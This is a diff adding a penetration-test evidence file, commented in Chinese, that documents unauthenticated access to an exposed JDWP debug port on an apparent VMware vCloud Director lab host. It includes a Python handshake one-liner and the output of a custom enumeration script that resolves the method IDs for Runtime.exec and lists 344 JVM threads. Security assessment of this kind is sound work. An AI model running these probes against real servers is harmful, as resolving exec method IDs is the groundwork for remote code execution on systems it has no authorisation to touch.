@@ -1,0 +1,30 @@
+# Evidence 04 — 未认证 JDWP 只读访问（从攻击机直接发起，无任何凭据）
+$ python3 -c "import socket;s=socket.create_connection(('192.168.98.x',5005),timeout=8);s.sendall(b'JDWP-Handshake');print(s.recv(14))"
+b'JDWP-Handshake'
+
+$ python3 jdwp_enum3.py         # 最小 JDWP 客户端：handshake -> IDSizes -> Version -> ClassesBySignature -> AllThreads
+[+] handshake OK; idSizes: method=8 obj=8 refType=8 frame=8
+[+] VM: name='OpenJDK 64-Bit Server VM' version='11.0.23.0.1' jdwp=11.0
+[+] Runtime refTypeId: ['0x1']
+[+] Runtime methods: 26
+    name=getRuntime sig=()Ljava/lang/Runtime;                    mid=0x7f0528811a98
+    name=exec       sig=(Ljava/lang/String;)Ljava/lang/Process;  mid=0x7f0528811ad0
+    name=exec       sig=([Ljava/lang/String;)Ljava/lang/Process; mid=0x7f0528811ae0
+    ...
+[+] threads: 344
+    0x2  Bootstrap Application
+    0x3  Reference Handler
+    0x4  Finalizer
+    0x7  Active Thread: Equinox Container: c034c2eb-...
+    0xa  JMX Monitor Scheduler Pool [Thread-1]
+    0xb  Tomcat JDBC Pool Cleaner[809762318:1786462431452]
+    0xc  PostgreSQL-JDBC-Cleaner
+    0x10 pool-jetty-33-acceptor-0@...-ServerConnector@...{HTTP/1.1}{vcd01.lab.local:80}
+    0x16 com.vmware.vcloud.networking.server.NetworkingCellApplication@... - listener dispatcher
+    0x17 com.vmware.vcloud.consoleproxy.server.ConsoleProxyCellApplication@... - listener dispatcher
+    0x1a com.vmware.vcloud.common.main.LegacyCellApplication@... - listener dispatcher
+    0x1c Session-HouseKeeper-7fd5d62-1
+    0x1e Artemis DiscoveryGroup Notification Listener@...
+    ...                                    （共 344 个线程，均可读取线程名）
+
+# => 未认证即可读取 JVM 版本 / 已加载类 / Runtime 方法表 / 全部线程及其名称（vCD 内部结构）。
